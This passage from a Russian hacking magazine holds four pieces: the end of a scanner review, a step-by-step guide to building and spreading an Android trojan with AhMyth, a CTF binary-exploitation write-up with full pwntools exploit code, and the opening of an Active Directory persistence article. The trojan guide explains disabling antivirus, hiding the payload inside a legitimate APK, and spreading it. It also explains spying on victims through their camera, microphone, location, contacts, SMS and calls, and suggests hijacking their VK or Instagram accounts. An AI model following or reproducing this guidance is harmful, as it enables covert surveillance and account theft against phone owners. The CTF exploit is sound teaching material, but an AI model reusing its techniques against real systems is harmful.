Windows). Чтобы выключить эту воз можность, поправь MobSF/settings.py,
указав в WINDOWS_VM_IP адрес тво ей виртуальной машины с RPC‐сервером.
  В целом инструмент очень хороший и удоб ный. Правда, лично у меня уста‐
новка вызвала некото рые проблемы — из‐за битых зависимостей.


СВОДНАЯ ТАБЛИЦА





ВЫВОДЫ
Как видишь, вовсе не обязательно ковырять сложные веб‐приложе ния
с тысячами страниц и прочий софт вручную. Вмес то этого можно пойти
по своим делам, сделать что‐нибудь по дому, ну или написать еще одну
статью в «Хакер». Огромная часть работы багхантера уже автоматизирована,
так что, пока все сидят дома, не упус ти свой шанс заработать денежку на мас‐
ки и антисептики. Или хотя бы на плат ную лицензию к сканеру!
ВЗЛОМ




      СОЗДАЕМ RAT ДЛЯ ANDROID
      С ПОМОЩЬЮ ПРОСТОГО
           КОНСТРУКТОРА





                                             Ghoustchat
                                           aio02012003@gmail.com





Благодаря  стараниям  Ило на  Маска  сегодня  можно
управлять «Тес лой», не умея водить машину. А благодаря
разработчику, который скрывается под ником AhMyth (и так
же назвал свою программу), любой желающий может соз‐
дать троян для Android, совершенно не умея программи‐
ровать. Как? Сейчас покажу.


Термином RAT (Remote Access Tool) принято называть утилиты удаленного
администрирования. Они могут использоваться в благих целях по своему
прямому назначению, как, например, зна мени тый TeamViewer, а могут уста‐
навливаться злодеями в глубокой тайне от пользователя. В подобных слу чаях
RAT нередко расшифровыва ют как Remote Access Trojan, и пря мой перевод
английского слова rat — «крыса» — тут при ходится как нельзя кстати.
   AhMyth RAT (Remote Access  Trojan) — это приложение с открытым
исходным кодом, в настоящее время находится на ста дии бета‐версии. Прог‐
рамма ориентирована на пользователей Windows, но на GitHub можно найти
исходники и для Unix‐подобных платформ.
   AhMyth RAT состоит из двух компонентов.
 1. Серверное приложение, с помощью которо го можно управлять заражен‐
  ным устройством и генерировать файлы APK с вредоносным кодом. Соз‐
   дано оно на Electron framework — фреймворке, разработанном в GitHub
   для создания простых графичес ких приложений.
 2. Клиентский APK, содержащий вредоносный  код, который позволяет
   получить удален ный доступ к зараженному устройству. То есть наш APK
   будет выполнять функции бэкдора.


УСТАНОВКА AHMYTH RAT
Серверная часть устанавлива ется очень просто, тем более автор выложил
в свободный доступ бинарники программы. Но при желании можно ском‐
пилировать ее из исходников. Лично я проводил свои тес ты на машине
под управлением Windows 10.
  Для работы утилиты нам необ ходима вир туальная машина Java. Устанав‐
ливаем ее с официального сайта Java. Затем нужно скачать бинарники самой
AhMyth. Их ты можешь найти в официальном репози тории проекта на GitHub,
вкладка Assets. При скачивании лучше отключить анти вирус, чтобы его не хва‐
тил удар от происходящего.


СОЗДАЕМ ЗАРАЖЕННЫЙ APK
Чтобы создать файл APK для Android, открой вкладку APK Builder. Внешний
вид конструктора вредонос ных мобильных приложений показан на сле‐
дующей иллюстрации.





                    Вкладка с конструктором APK

Пользоваться этим инструментом очень просто. В окне Source IP мы про‐
писываем IP‐адрес атакующей машины (этот адрес потом легко вычисляется
при исследовании вредоноса). В поле Source Port ты можешь указать порт,
который будет зарезервирован машиной для прос лушивания подключений.
По умолчанию исполь зуется порт 42 474.


           WARNING

                   Помни,  что распространение  вирусов и  вре‐
                      доносных  программ —  незакон ное  действие
                      и влечет за собой уголовную ответственность.
                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не призывают к использованию полученных зна‐
                      ний в прак тических целях и не несут ответствен‐
                       ности за любой возможный вред, причиненный
                      материалом.


Без использования дополнительной опции Bind With Another Apk ты сгенери‐
руешь мобильное приложение только с вредонос ным кодом. И это прак‐
тически бесполезно, пос кольку заставить юзера установить такую программу
можно разве что под пытками.
  Но есть проверенный способ соз дания малвари, который используют все
продвинутые вирмейкеры: найти в интернете какой‐нибудь APK и склеить его
с вре доносом. Для это го пос тавь фла жок Bind With Another Apk, выбери нуж‐
ный APK и укажи метод интегра ции вредоноса в телефон. Есть два метода:
при запуске зараженного APK или при перезагрузке телефона после установ‐
ки RAT. Авторы программы рекомендуют второй вари ант.
  Осталось нажать кнопку Build — по умолчанию зараженный файл сохраня‐
ется в папку C:\Users\<Your_Username>\AhMyth\Output.


РАСПРОСТРАНЕНИЕ И ЗАРАЖЕНИЕ
Как распространяются соб ранные таким методом вре доносы — это отдель‐
ная тема для дискуссий. Отмечу только, что в Google Play регулярно обна‐
руживают зараженные RAT прог раммы и столь же регулярно их оттуда
выпиливают, что не мешает малвари появляться в этом каталоге снова. Кро‐
ме того, методы социальной инженерии никто не отме нял. Но помни, что
для активации трояна пос ле установки при ложения обязательно нужно запус‐
тить или перезагрузить зараженное устройство (в зависимости от настроек
билдера).





                   Запуск вируса на устрой стве

Для успеха также требуется, что бы в настройках целевого устрой ства был
отключен параметр «Уста новка только из доверенных источников».


СОЕДИНЯЕМСЯ С ЗАРАЖЕННЫМ УСТРОЙСТВОМ
Теперь нам нужно перейти во вкладку Victims и вбить в поле тот же порт, что
мы указывали раньше, чтобы сервер ждал подключений от зараженных
устройств. Опять же если ты ничего не менял при сборке APK, то ничего
не надо указывать и здесь.
  Нажимаем на Listen, и, если наш APK успешно заразил мобильное устрой‐
ство, мы увидим новое подклю чение.





                     Дос тупные устрой ства

Программа также логиру ет все действия в консоли, расположенной в нижней
части окна. Значения колонок журнала в целом очевидны. Country — страна,
в которой работает зараженное устройство. Manuf — компания — изготови‐
тель девайса. Model — код или наз вание модели устройства. Release — вер‐
сия операционной системы зараженного девайса (в моем случае это Android
10). IP — IP‐адрес устройства, а Port — порт, через который инфицированный
девайс подклю чился к атакующей машине.
   Теперь пора переходить к активным действиям — для этого смело жми
на кнопку Open The Lab.


ВОЗМОЖНОСТИ AHMYTH
Нашему вниманию будет предложено меню из семи пунктов, которое откры‐
вает доступ к разным функциям прог раммы.


             INFO

                    При подключении к устройству возможны неболь‐
                   шие перебои в работе сервера, однако потом
                      подключение восстанавливается. Немного тер‐
                        пения!



Камера
Для начала заглянем в раз дел Camera. Выбери камеру: фронталку (Front)
или основную (Back) — и можешь сделать снимок нажатием на кнопку Snap.
Правда, у меня почему‐то не получилось толком сфо тографировать, хотя все
мои камеры на устрой стве были успешно инициализированы.





            Камера работает, а фото не получа ется. Печаль!


Файловый менед жер
Файловый менеджер здесь не такой продвинутый, как в других подобных ути‐
литах, однако все равно это очень полезная вещь. С его помощью можно
как минимум скачивать нужные нам файлы с зараженного устройства.
Как видишь, начальная директория — это корневой каталог, к которому есть
доступ только с правами администра тора.





                                        File Manager


Микрофон
Эта функция позволяет использовать микрофон устройства в фоновом
режиме и записать все, что «слышит» телефон в течение указанного вре мени
(в окне Seconds нужно числом задать продолжительность записи в секундах).
Далее жмем Record и ждем. Полученный файл можно прос лушать пря мо
в окне программы или сохранить себе на машину.





            Превращаем зараженный телефон в диктофон


Ге опо зиция
На мой взгляд, это самая интерес ная возможность AhMyth. Если на инфи‐
цированном устрой стве включена передача геоданных, ты сможешь узнать
геопозицию человека с точностью до десяти метров. Известно, что неопыт‐
ные пользователи очень редко вспомина ют об этом параметре и оставляют
его включенным. Плюс некоторые приложения (те же карты), использующие
передачу геоданных, ког да‐нибудь да заставят человека включить эту фун‐
кцию.





            Тут можно узнать геопо зицию зараженного телефона


Кон такты
С помощью этой функции можно вытащить весь спи сок контактов, которые
записаны в телефоне. Есть возможность ска чать весь список контактов себе
на машину.





                  Получа ем список кон тактов


SMS
Еще один очень любопытный раздел. С его помощью мы можем отправить
кому‐то SMS или просмотреть и ска чать все сообщения, которые пришли
на это устройство.
   Чтобы отправить SMS, зайди во вкладку Send SMS, укажи номер телефона
получателя (поле TO://), а в поле Message вбей жела емый текст сообщения.
После этого останется только нажать на кноп ку SEND.
   Эту функцию можно использовать для сброса паролей учетных записей
владельца зараженного  устройства, нап ример для взлома «Вконтакте»
или Instagram.





        Мы можем отпра вить сооб щение любому получателю





            И даже просмотреть список сообщений


Журнал вызовов
Этот раздел открывает перед нами  возможность просмотреть спи сок
телефонных вызовов. Тут представлено четыре блока информации о каждом
вызове: номер, с которым свя зывалось зараженное устройство; название
контакта, к которому привязан этот номер на зараженном устройстве; время
длительности вызова (в секундах); тип вызова (входящий или исходящий).





                       Журнал вызовов

Очень полезный инструмент — разумеется, в умелых руках.


КАК ЗАЩИТИТЬСЯ ОТ RAT?
Как бы банально это ни звучало, никогда не давай свой телефон в чужие руки
и не устанавливай сомнитель ные приложения. На самом деле это практичес‐
ки единственный способ обеспечить собственную безопас ность. И конечно
же, всегда обращай внимание на предупреждения сис темы о возможном
вреде, который может причинить устройству скачанное приложение.


НАПУТСТВИЕ
Надеюсь, что ты будешь использовать ути литу AhMyth RAT только в иссле‐
довательских целях на своих личных устройствах. Не забывай: «Чем больше
сила, тем больше и ответс твенность»!
 ВЗЛОМ
   СОВСЕМ
       НЕ
   USELESS
     CRAP





   Павел Блинников    Студент кафедры                 КАЧАЕМ СКИЛЛ
     «Криптология и
кибербезопасность» НИЯУ             БИНАРНОЙ ЭКСПЛУАТАЦИИМИФИ. Люблю бинарщину,
 CTF и бинарщину в CTF.    Telegram: @pturtle       НА СЛОЖНОЙ ЗАДАЧЕ С CTF
  pcherepaha@yandex.ru




 PWN — одна из наиболее самодостаточных категорий тас‐
 ков на CTF‐соревнованиях. Такие задания быстро готовят
  к анализу кода в боевых условиях, а райтапы по ним чаще
 всего описывают каждую деталь, даже если она уже была
 многократно описана. Мы рассмотрим таск Useless Crap
 с апрельского TG:HACK 2020. Сам автор оценил его слож‐
 ность как Hard. Задание очень инте ресное, во вре мя сорев‐
 нования я потратил на него около две надцати часов.


 ПОДГОТОВКА
  Для начала расскажу об инс тру ментах, которые я использовал.
    Я предпочел не выбирать однозначно между IDA и Ghidra и использую
  один или другой дизассемблер в зависимос ти от ситуации, но в тасках
  категории PWN хороший псевдокод чаще выда ет IDA.
    «Ванильный» GDB невозможно использовать без очень серьезной пси‐
  хологической подготов ки, так что чаще всего его юзают в сочетании с одним
  из плагинов: PEDA, GEF или pwndbg. Из них PEDA — самый старый (клас‐
  сический!) вариант, но я до сих пор не переехал на один из новых, так что
  использую его.
     Также, пока весь мир полностью переезжает на Python 3, разработчики
  эксплоитов и не думают о том, чтобы покидать любимый Python 2. Дело
  в очень неприят ной обработке raw bytes в третьей ветке Python, приходится
  постоянно держать в голове ее осо бенности и тратить лишнее время
  на исправ ление возникающих багов.
    Полезные допол нительные инстру менты:
   • pwntools  как самый  удоб ный  API  на  Python  для  взаимодействия
    с исполняемыми файлами;
   • checksec — для определения защитных механизмов бинарника;
   • patchelf как инструмент для пат чинга libc и исполняемых фай лов.


 ПЕРВОНАЧАЛЬНЫЙ ОСМОТР





  Итак, организаторы дали нам бинарник и файлы серверной libc и линковщика.
  Также точно указан путь до флага; опытные игроки в CTF сразу могут пред‐
  положить, что придется писать свой шелл‐код.
    Очевидно, самое первое, что нужно сделать, — это прос то выполнить
  бинарник и пример но оценить слож ность, быс тренько просмотрев security
  mitigations в checksec.
    Чтобы исполняемый файл использовал нужную libc, пропатчим в нем путь
  до линкера и укажем ее в переменной окру жения LD_PRELOAD.


  patchelf ‐‐set‐interpreter ld‐2.31.so ./crap
  LD_PRELOAD=./libc‐2.31.so ./crap





  Нас встречает незамысловатая менюш ка, появляется надежда на быстрое
  и простое решение. Живет  эта надежда, правда, недолго, при мерно
  до открытия checksec.





  У нас включены на максимум все защитные механизмы. Вот их краткое опи‐
  сание.
   NX — делает стек неисполняемым. Около двадцати лет назад большинс‐
  тво уязвимостей переполнения буфера эксплуатировали запись шелл‐кода
  на стек с последующим прыжком на него. NX дела ет такую технику невоз‐
  можной, однако сейчас она еще жива в мире IoT.
    Stack canary — определенное секретное зна чение на сте ке, записанное
  перед RBP и return pointer и, таким образом, защищающее их от перезаписи
  через уязвимость переполнения буфера.
     Full RELRO — делает сег мент GOT доступным только для чтения и раз‐
 мещает его перед сегментом BSS. Техники экс плуатации через перезапись
 GOT несложны, но выходят за рамки этой статьи, так что предлагаю читателю
  самому разобраться с ними. О том, что такое Global Oﬀset Table, можно про‐
  читать, например, в Википедии.


 КАК РАБОТАЮТ ASLR И PIE?
  ASLR — это защитный механизм, который значительно усложняет экс плуата‐
  цию. Его основная задача — рандомиза ция базовых адресов всех регионов
  памяти, кроме сек ций, принадлежащих самому бинарнику.
    По сути, ASLR работает следующим обра зом. В диапазоне адресов,
  который на несколько порядков превышает раз мер рандомизируемого реги‐
  она памяти, выбирается начальная точка отсчета, базовый адрес. К нему есть
  два требования:
   • последние три ниббла («полубайта») этого адреса должны быть рав‐
    ны 000;
   • весь рандомизированный регион не должен конфликтовать с другими
     регионами и выходить за рамки пред ложенного диапазона.

  Главная проблема атакующего в том, что это дей ствительно работает. Можно
  взять конкретный пример: нужно найти адрес функции system в libc, при этом
  никакой информации о нем не известно. Давай примерно представим, сколь‐
  ко времени на это понадобится. Первый байт любого адре са биб лиотеки поч‐
  ти обязан быть равен 0x7f. Пос ледние три ниб бла мы знаем, так как незави‐
  симо от выбора базового адреса они остаются теми же при каждом запус ке
  программы. Достаточно нес ложная школьная задачка по комбинаторике:


  2^8 * 2^8 * 2^8 * 2^4 = 2^28 = 268 435 456

  Это примерная оценка, так как не учи тывается опре деленное количес тво
  адресов вверху диапазона, которые брать нель зя, иначе остальной регион
  памяти тогда не уместится; тем не менее она дос таточно точная. Допустим,
  на каждый запуск эксплоита в среднем мы тратим три секунды. Тогда полный
  перебор займет примерно 25 лет, что нас явно не устраивает, ведь CTF идет
  всего 48 часов.
    Ну и наконец, PIE — это, по сути, ASLR для сегментов памяти самого
  исполняемого файла. В отличие от базового ASLR, который работает
  на уровне ОС, PIE — это опциональный защитный механизм, он может и не
  присутствовать в бинарнике.


 РЕВЕРС-ИНЖИНИРИНГ ПРОГРАММЫ
  Есть легенда, что если реверсера раз будить среди ночи и дать ноутбук, то он
  первым делом откроет IDA и нажмет F5. Не знаю, насколько это правда,
  но всегда поступаю именно так, когда хочу разобраться, как работает неиз‐
  вестный исполняемый файл.





 Нам повезло, декомпилированный псевдокод выглядит при ятно и легко чита‐
  ется, так что боль ших проблем с пониманием механизмов исполняемого
  файла быть не дол жно.
    Рассмотрим функции по порядку.


  1. init





  Здесь нет ничего по‐настоящему интерес ного, прос то отключается буфери‐
  зация ввода и вывода и устанавлива ется время работы программы (пос‐
  ле 0x3c секунд произой дет прыжок на handler, функцию, которая состоит
  из одной строки: exit(0);).


  2. sandbox





  Эта функция намного интерес нее предыдущей: ока зывается, в программе
  достаточно жестко настро ен seccomp. Давай разберемся, какие системные
  вызовы разрешены. Найти таб лицу соот ветствий названий сисколлов с их
  номерами не представляет тру да.
     Итак, абсолютно точно разрешены exit, mprotect, open и close. Нем‐
  ного, но уже становится понятен финальный этап экс плуатации: нужно будет
  сделать один из регионов памяти доступным для чтения, записи и исполне‐
  ния, записать туда шелл‐код на чтение файла с флагом и прыгнуть на него.





  Также доступны системные вызовы read и write, но не пол ностью. IDA
  не показывает аргументы seccomp_rule_add после  четвертого, а ведь
  основные правила настройки для заданных сисколлов именно там. Нажав
  правой кнопкой мыши на название функции, можно выбрать опцию Set call
  type и, таким образом, дописать еще нес колько __int64, чтобы увидеть боль‐
 ше аргументов.





 По опыту работы с seccomp могу ска зать, что IDA не совсем правильно опре‐
  делила седьмой аргумент, который равен SCMP_CMP_EQ (это 4), но становится
  ясно, что программа может читать только из нулевого дескриптора (stdin),
  а писать только в первый дес криптор (stdout). Пока что не совсем понятно,
  как тогда написать шелл‐код, ведь читать нужно в любом случае из дескрип‐
  тора открытого файла, который точно не равен нулю. Но об этом поз же.


  3. menu





  Это меню, которое выводится каждую итерацию цикла в main.


  4. get_num





 Получение номера выбранной функции происхо дит безопасно, здесь нет
  ничего интересного для нас.


  5. do_read





  Автор таска предоставля ет нам чистый arbitrary read. Не могу сказать, что
  это очень редкое и уникальное решение, но такие задания чаще все го крайне
  интересны. Мы можем прочитать что угодно отку да угодно не более двух раз,
  по крайней мере так будет считать программа. Переменная read_count гло‐
  бальная, а значит, хранит ся не на стеке, а в BSS. В дальнейшем понимание
  этого может облегчить экс плуатацию.


  6. do_write





 Похожим образом работает do_write. У нас появляется воз можность
  записывать что угодно куда угодно, пока write_count меньше еди ницы
  или равен ей. Сразу можно придумать обход механиз ма проверки: пос ле каж‐
  дой записи через следующий do_write прис ваивать write_count значение
  ‐1, таким образом получить полный, ничем не ограниченный arbitrary write
  и схожим образом arbitrary read.
   Мы еще не успели прочитать весь код, а уже имеем серьезный контроль
  над потоком выпол нения программы.


  7. leave_feedback





  При выборе третьей опции меню вмес то незамедлительного выхода прог‐
  рамма попросит оставить обратную связь. Это происходит следующим обра‐
  зом:
   • проверяется, равен ли нулю гло бальный ука затель feedback;
   • если нет, то программа аллоциру ет чанк раз мером 0x501 и даст нам
    непосредственный ввод в него;
   • затем пользователя спрашивают: хочет ли он, что бы его фидбек был сох‐
     ранен;
   • если он введет n, то чанк будет освобожден, но указатель feedback
    не обнулится.

 Пока что эта ошибка некритична, но в дальнейшем может быть очень полез‐
  на.





  Чтобы вызвать эту функцию, нужно ввести цифру 4, упоминания о которой нет
  в меню. Функция view_feedback выводит то, что находится по указате лю
  feedback, не проверяя состояние чанка, который может быть освобожден.
  Такой тип уязвимостей называется Use‐After‐Free. Подразумевается, что
  по адресу указателя дол жен лежать пользователь ский ввод, но чуть поз же мы
  увидим, что для освобожденных чанков это не всегда так.


                                       Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
            USELESS  СОВСЕМ НЕ
              CRAP
           КАЧАЕМ СКИЛЛ БИНАРНОЙ ЭКСПЛУАТАЦИИ
                      НА СЛОЖНОЙ ЗАДАЧЕ С CTF





UAF И ПОЧЕМУ ЭТО ХОРОШО
Более подробно о реализации ptmalloc можно прочитать в блоге Sploit Fun,
но мы рассмотрим работу с кучей упро щенно. Что бы понять, что происходит,
когда программист создает чанк размером 1281 байт, а затем освобождает
его, напишем свою программу.


#include <stdio.h>
#include <stdlib.h>


int main() {
  void **a, *b;


  a = calloc(1, 1281);
  b = malloc(200);
  free(a);
  printf("%p\n", *a);
}

Чанк b нужен для того, что бы не произошло консолидации с топ‐чанком
и попросту полного удаления структуры a после его освобождения.
 • calloc(1,  1281) вернет ука затель ровно на то место, куда можно
   записывать данные, не думая о внутренних механизмах реализации кучи.
 • Размер a больше 1032, поэтому после free(a) он попадет в так называ‐
  емый unsorted bin. При этом forward pointer и backward pointer (это указате‐
   ли, созданные для того, чтобы ускорить работу ptmalloc) чанка, попавшего
   в unsorted bin, указывают в libc.
 • Указатель a будет равен адресу, по которому рас полагается forward point‐
    er. Таким образом, там, где раньше лежали пользовательские данные,
   сейчас лежит указатель в libc, и printf нам его выведет.

Теперь стал ясен первый этап экс плуатации.
 1. Зайти в leave_feedback и ска зать прог рамме, что нужно удалить
   оставленную обратную связь.
 2. Выполнить view_feedback и таким обра зом получить адрес libc.

Можно выполнить это в GDB,  чтобы посчитать оффсет до корня  libc
и получить базовый адрес.
 1. Через set execwrapper env 'LD_PRELOAD=./libc2.31.so' под‐
   гружаем нужную версию libc.
 2. С помощью команды vmmap смотрим все реги оны памяти.





 3. Последовательно выполняя команды ni и si, доходим до инструкции,
   которая вызывает free нужного нам чанка, и через x/6b посмотрим на то,
   какой указатель там лежит.



По 0x7f в конце становится понятно, что перед нами один из адресов libc.
Посчитать разницу 0x7ﬀﬀ7fc2be0 и 0x7ﬀﬀ7c0d000 не составит труда: она рав‐
на 0x3b5be0. Итак, мы знаем точный оффсет от корня libc до полученного
адреса.
  Можно начать писать экспло ит:


from pwn import *


p=process('./crap')


p.recvuntil('>')
p.sendline('3')
p.recvuntil(': ')
p.sendline('AAAA')
p.recvuntil('y/n')
p.sendline('n')
p.recvuntil('>')
p.sendline('4')


# Парсинг нужного куска вывода
x = p.recvline().strip().split(': ')[‐1][::‐1].encode('hex')
libc_base = int(x, 16) ‐ 0x3b5be0
print 'libc base is', hex(libc_base)


УВЕЛИЧИВАЕМ КОНТРОЛЬ
Для упрощения грядущей раз работки эксплоита почти необходимо описать
функции read и write через собственные обертки на Python.


def read(addr):
  p.sendline('1')
  p.recvuntil('addr: ')
  p.sendline(hex(addr)[2:])
  x=p.recvline().strip().split(': ')[‐1]
  p.recvuntil('>')
  return x


def write(where, what):
  p.sendline('2')
  p.recvuntil(': ')
  p.sendline('{} {}'.format(hex(where)[2:], hex(what)[2:]))
  p.recvuntil('>')

Мы сделали первые шаги в эксплуата ции, но успех еще далеко. Адрес libc —
это, конечно, неплохо, но нам точно понадобятся адреса PIE и стека
для дальнейшей эксплуата ции. В glibc существу ет глобальная переменная
environ, которая указывает на переменные окру жения, хранящиеся на сте ке,
так что осталось только узнать ее значение. Можно поступить следующим
образом.
 • Через environ получить адрес стека.
 • Методом научного тыка найти такую позицию на стеке, в которой при каж‐
  дом запуске будет хра нить ся один из адресов PIE.

Посчитать оффсет от адреса environ до кор ня libc можно так же, как мы
делали это раньше: через команды x и vmmap.
  Написать код для выполнения обозначенных шагов достаточно нес ложно:


environ=libc_base+0x3b8618
print 'environ is', hex(environ)


stack=int(read(environ), 16)
print 'stack is', hex(stack)


# ‐48 можно получить как просмотрев стек в GDB,
# так и обычным перебором
pie=read(stack‐48)
# ‐2970 и следующие оффсеты получены через x и vmmap
pie=int(pie, 16)‐2970
read_count=pie+2105392
write_count=pie+0x202033
feedback=pie+0x202038


print 'pie is', hex(pie)


write(read_count, 0) # read_count=0
write(write_count, 0xfffffffffffffff0) # write_count = ‐16


ЧТО ТАКОЕ ЭТОТ ROP?
Сама по себе техника ROP очень изящна, ознакомиться с ней я советую даже
людям, не планирующим в дальнейшем серьезно заниматься разработкой
эксплоитов. Научиться базовым трю кам можно, например, на сайте ROP Em‐
porium. Также «Хакер» не раз писал об этой технике.


            ROPЧитай так же про
 • Развратно‐ориентированное программирование: трюки ROP, приводя щие
   к победе (архивная статья 2010 года)
 • В королевстве PWN. ROP‐цепочки и ата ка Return‐to‐PLT в CTF Bitterman
 • Пишем сплоит для обхода DEP: ret2libc и ROP‐цепочки против Data Execu‐
    tion Prevention



Сейчас нужно понимать только то, что ROP — техника бинарной экс плуата‐
ции, основная фишка которой — составление своей программы из кусочков
эксплуатируемой. Существу ет понятие гаджета — это такой кусочек прог‐
раммы, после выпол нения которо го хакер не теря ет контроль над потоком
выпол нения, а может выполнять следующие гаджеты.
  Нам нужно сделать один из регионов памяти Readable, Writable и eXe‐
cutable (rwx). Достичь изменения прав можно, вызвав функцию mprotect сле‐
дующим образом:


mprotect(addr, some_size, 7)

Третий аргумент указывает как раз на то, что мы хотим сделать регион rwx.
  Положить нужные значения в нужные регистры нам поможет техника ROP.
В 64‐битном Linux аргументы соответствуют регис трам в сле дующем поряд‐
ке:
 • RDI — I
 • RSI — II
 • RDX — III
 • RCX — IV
 • R8 — V
 • R9 — VI

Следующие аргументы, если они есть, находят ся на стеке.
  ROP естественно использовать при эксплуата ции уязвимос ти перепол‐
нения буфера, но здесь у нас ее нет, как и нет возможности создать ее
искусственно. Поэто му будем использовать следующий алгоритм.
 • Через do_write пишем на стек ROP‐цепочку таким образом, чтобы
   начало этой цепочки отстояло от return address функции do_write ровно
   на 16 байт.
 • Когда цепочка будет пол ностью записана на стек, перезапишем return
  address do_write на гаджет вида pop some_reg; pop some_reg;
  ret;. Таким образом, этот гаджет съест 16 байт, которые мы оставляли
   от return pointer до ROP‐цепочки, и полностью ее выполнит.

В качестве подопытного я выб рал адрес, отстоящий на 0x201000 от корня PIE,
и попробовал изменить права на него. Сама цепь схематично дол жна выг‐
лядеть примерно так:


make rdi = (pie+0x201000)
# 1000 — число с потолка. Можно любое другое,
# потому что mprotect изменит права всего региона
make rsi = 1000
make rdx = 7
call mprotect

Для поиска гаджетов существу ет много инс трументов, я использую ROPgad‐
get.
  Давай скормим программе данный нам libc и найдем все нужные нам гад‐
жеты. Сделать это можно при помощи команды


ROPgadget ‐‐binary libc‐2.31.so > n





Далее при помощи любого тексто вого редактора можно из огромного спис ка
найти нужные нам кусоч ки. В нашем случае прекрасно подойдут сле дующие
гаджеты:


0x0000000000021882 : pop rdi ; ret
0x0000000000022192 : pop rsi ; ret
0x000000000012c561 : pop rax ; pop rdx ; pop rbx ; ret
0x000000000002187f : pop r14 ; pop r15 ; ret

Последний  гаджет будем  использовать  в  качес тве  спус кового крючка
для выполнения цепочки. Оффсет до mprotect можно най ти через GDB. Итак,
код эксплоита:


pop_rdi = 0x21882
pop_rsi = 0x22192
pop_rax_rdx_rbx = 0x12c561
pop_r14_r15 = 0x2187f


place=pie+0x201000
mprotect = libc_base + 986064


# Сдвиг можно посчитать, поставив брейк‐пойнт
# на инструкцию ret функции do_write
add = stack ‐ 264


write(add, libc_base+pop_rdi)
write(write_count, 0xfffffffffffffff0)
write(add+8, place)
write(write_count, 0xfffffffffffffff0)
write(add+16, libc_base+pop_rsi)
write(write_count, 0xfffffffffffffff0)
write(add+24, 1000)
write(write_count, 0xfffffffffffffff0)
write(add+32, libc_base+pop_rax_rdx_rbx)
write(write_count, 0xfffffffffffffff0)
write(add+40, 0)
write(write_count, 0xfffffffffffffff0)
write(add+48, 7)
write(write_count, 0xfffffffffffffff0)
write(add+56, 0)
write(write_count, 0xfffffffffffffff0)
write(add+64, mprotect)
write(write_count, 0xfffffffffffffff0)


# Когда цепочка отработала, прыгаем на main
write(add+72, pie+0x0000000000001192)
write(write_count, 0xfffffffffffffff0)


# Здесь мы закончили писать ROP,
# и нужно заставить программу его выполнить


# Позиция на стеке, на которой лежит return address do_write
ret = stack ‐ 288


write(ret, libc_base+pop_r14_r15)
write(write_count, 0xfffffffffffffff0)

Нужный нам регион стал дос тупен для чтения, записи и исполнения кода.


ПИШЕМ ШЕЛЛ-КОД
Вот и пришло время подумать, как имен но писать шелл‐код для завершения
эксплуатации. Во время CTF на этот этап я потратил около десяти часов
и чудом наткнулся на воп рос со Stack Overﬂow, который подвел меня к нужной
мысли.
  Идея такая: новому открытому файлу выдается минимальный из воз‐
можных файловых дескрипторов. Тог да если нулевой дес криптор был бы сво‐
боден, то open("flag.txt", O_RDONLY) вернул бы ноль, то есть к файлу
можно было бы обращаться как к stdin в обычных условиях. Достичь этого
можно, просто выполнив close(0), ведь системный вызов close разрешен
seccomp.
   Это простая, но одновремен но кра сивая идея. Именно она сделала этот
таск одним из интереснейших среди когда‐либо решенных мной.


shell='''
  mov rdi, 0
  mov rax, 3
  syscall ; closing stdin


  mov rsi, 0
  push 0
  mov rcx, 8392585648256674918 ;  «flag.txt» in little‐endian
  push rcx
  mov rdi, rsp
  mov rax, 2
  syscall


  mov rax, 0
  mov rdi, 0
  mov rsi, rsp
  mov rdx, 60
  syscall ; writing flag to the top of the stack


  mov rdi, 1
  mov rsi, rsp
  mov rdx, 60
  mov rax, 1
  syscall ; printing flag
  '''
print shell


# pwntools предоставляет очень удобный API для написания шелл‐кодов
shellcode=asm(shell).encode('hex')


# Не стоит пугаться этого цикла. Это просто запись по 8 байт
for i in range(13):
  print(i)
  write(place+(i*8), int(shellcode[i*16:(i+1)*16].decode('hex')[::‐1]
.encode('hex'), 16))
  write(write_count, 0xfffffffffffffff0)


ИСПОЛЬЗУЕМ FREE_HOOK
GNU C предоставляет нам воз можность изменять поведение функций
malloc, free и realloc, используя соответс твующие хуки. Если значения __‐
malloc_hook, __free_hook или __realloc_hook будут не равны нулю, то
программа прыгнет на адреса, записанные в них, при попытке выполнить
соответствующие функции.
   Кстати, почитать об этой и дру гих фишках бинарной эксплуатации можно
в репозитории CTF‐pwn‐tips, во время соревнований он действительно
помогает.
  Закончить эксплуатацию я хочу, прыгнув на шелл‐код через __free_hook.
Напомню, что программа выполняет free, если в функции leave_feedback
выбрать опцию удаления обратной связи. Завершающая часть эксплоита:


free_hook=3898952+libc_base


print 'free_hook is', hex(free_hook)
print 'place is', hex(place)
print 'feedback is', hex(feedback)
write(free_hook, place)
write(write_count, 0xfffffffffffffff0)
write(feedback, 0)


# Триггерим free
p.sendline('3')
p.recvuntil(': ')
p.sendline('AAAA')
p.recvuntil('y/n')
p.sendline('n')
p.interactive()





ВЫВОДЫ
Спасибо  автору  таска PewZ  за  интересную идею  и  предоставление
докер‐контейнера с игрового сервера. Решить таск самостоятельно можно,
если выполнить сле дующую команду:


nc ctf.sprush.rocks 6001

Как минимум в течение месяца после пуб ликации статьи (то есть до середи ны
июня 2020 года) она должна работать.
ВЗЛОМ


ЗАКРЕПЛЯЕМСЯ
       В ACTIVE DIRECTORY
                КАК СОХРАНИТЬ ДОСТУП
                ПРИ АТАКЕ НА ДОМЕН





                                                                                        RalfHacker
                                                                                            hackerralf8@gmail.com





Представь, что мы скомпрометирова ли привилегирован ные
учетные записи, используя разные техники повышения при‐
вилегий, распростра нились по сети, скрылись от средств
обнаружения,   но   неожидан но   потеряли   контроль
над доменом, потому что администратор по какой‐то при‐
чине сменил пароль! В сегодняшней статье мы раз берем
способы сохранить администра тив ный доступ, даже если
администратор сменил пароли или разрешения.


Дру гие статьи про ата ки на Active Directory
 • Разведка в Active Directory. Получаем пользовательские данные в сетях
   Windows без привилегий
 • Атаки на Active Directory. Раз бира ем акту альные методы повыше ния при‐
   вилегий
 • Боковое перемещение в Active Directory. Раз бираем техники Lateral Move‐
   ment при атаке на домен
 • Защита от детекта в Active Directory. Уклоняемся от обнаружения при атаке
   на домен
 • Защита от детекта в Active Directory. Как обмануть средства обнаруже ния
   при атаке на домен
 • Сбор учеток в Active Directory. Как искать критически важные данные
   при атаке на домен
 • Бэкдоры в Active Directory. Используем групповые политики, чтобы сох‐
   ранить доступ к домену




           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный информацией из этой статьи.



